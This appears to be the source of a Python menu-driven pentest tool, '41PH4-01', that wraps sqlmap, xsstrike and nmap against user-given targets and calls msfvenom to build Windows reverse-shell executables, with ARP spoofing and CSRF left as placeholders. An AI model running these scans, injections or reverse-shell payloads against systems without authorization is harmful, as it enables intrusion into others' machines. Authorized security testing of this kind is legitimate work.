import os
import sys
import json
import subprocess
import requests
import threading
from urllib.parse import urljoin, urlencode
from bs4 import BeautifulSoup

# Global Settings
CONFIG_FILE = "settings.json"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
}

# Splash Screen
def print_banner():
    banner = """
    ======================================
            41PH4-01 Pentest Framework
    ======================================
    """
    print(banner)

# Load/Save Configuration
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as file:
            return json.load(file)
    return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as file:
        json.dump(config, file, indent=4)

# Dependency Installation
def install_dependencies():
    print("\nChecking and installing dependencies...\n")
    dependencies = ["sqlmap", "xsstrike", "nmap"]
    for tool in dependencies:
        try:
            subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f"{tool} is already installed.")
        except subprocess.CalledProcessError:
            print(f"Installing {tool}...")
            subprocess.run(["sudo", "apt-get", "install", "-y", tool])

# Web Application Testing Modules
def sql_injection_test(target_url):
    print("[*] Testing for SQL Injection vulnerabilities...")
    subprocess.run(["sqlmap", "-u", target_url, "--batch"])

def xss_test(target_url):
    print("[*] Testing for XSS vulnerabilities...")
    subprocess.run(["xsstrike", "--url", target_url])

def csrf_test(target_url):
    print("[*] Testing for CSRF vulnerabilities...")
    # Placeholder for CSRF testing logic
    print("CSRF test completed. (To be expanded)")

# Network Testing Modules
def network_scan(ip_range):
    print(f"[*] Scanning network: {ip_range}...")
    subprocess.run(["nmap", "-A", ip_range])

def arp_spoofing(target_ip, gateway_ip):
    print("[*] Performing ARP Spoofing...")
    # Placeholder for ARP spoofing logic
    print("ARP Spoofing module under development.")

# Exploitation Modules
def generate_payload(payload_type, lhost, lport):
    print(f"[*] Generating {payload_type} payload...")
    payload_file = f"{payload_type}_payload"
    subprocess.run(["msfvenom", "-p", payload_type, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", payload_file])
    print(f"Payload saved to {payload_file}")

# Information Gathering Modules
def scrape_website(target_url):
    print("[*] Scraping website for information...")
    response = requests.get(target_url, headers=HEADERS)
    soup = BeautifulSoup(response.content, "html.parser")
    print("[*] Website Title:", soup.title.string if soup.title else "None")
    print("[*] Links Found:")
    for link in soup.find_all("a"):
        print(urljoin(target_url, link.get("href")))

# Main Menu
def main_menu():
    while True:
        print("\n[1] Web Application Testing")
        print("[2] Network Testing")
        print("[3] Exploitation")
        print("[4] Information Gathering")
        print("[5] Install Dependencies")
        print("[0] Exit")
        choice = input("\nSelect an option: ")

        if choice == "1":
            web_app_menu()
        elif choice == "2":
            network_menu()
        elif choice == "3":
            exploitation_menu()
        elif choice == "4":
            info_gathering_menu()
        elif choice == "5":
            install_dependencies()
        elif choice == "0":
            print("Exiting...")
            sys.exit(0)
        else:
            print("Invalid choice. Please try again.")

# Submenus
def web_app_menu():
    target_url = input("Enter target URL: ")
    print("\n[1] SQL Injection")
    print("[2] Cross-Site Scripting (XSS)")
    print("[3] Cross-Site Request Forgery (CSRF)")
    choice = input("\nSelect an option: ")

    if choice == "1":
        sql_injection_test(target_url)
    elif choice == "2":
        xss_test(target_url)
    elif choice == "3":
        csrf_test(target_url)
    else:
        print("Invalid choice.")

def network_menu():
    print("\n[1] Network Scan")
    print("[2] ARP Spoofing")
    choice = input("\nSelect an option: ")

    if choice == "1":
        ip_range = input("Enter IP range (e.g., 192.168.1.0/24): ")
        network_scan(ip_range)
    elif choice == "2":
        target_ip = input("Enter target IP: ")
        gateway_ip = input("Enter gateway IP: ")
        arp_spoofing(target_ip, gateway_ip)
    else:
        print("Invalid choice.")

def exploitation_menu():
    print("\n[1] Generate Reverse Shell Payload")
    choice = input("\nSelect an option: ")

    if choice == "1":
        payload_type = input("Enter payload type (e.g., windows/meterpreter/reverse_tcp): ")
        lhost = input("Enter LHOST: ")
        lport = input("Enter LPORT: ")
        generate_payload(payload_type, lhost, lport)
    else:
        print("Invalid choice.")

def info_gathering_menu():
    target_url = input("Enter target URL: ")
    scrape_website(target_url)

# Entry Point
if __name__ == "__main__":
    print_banner()
    config = load_config()
    main_menu()
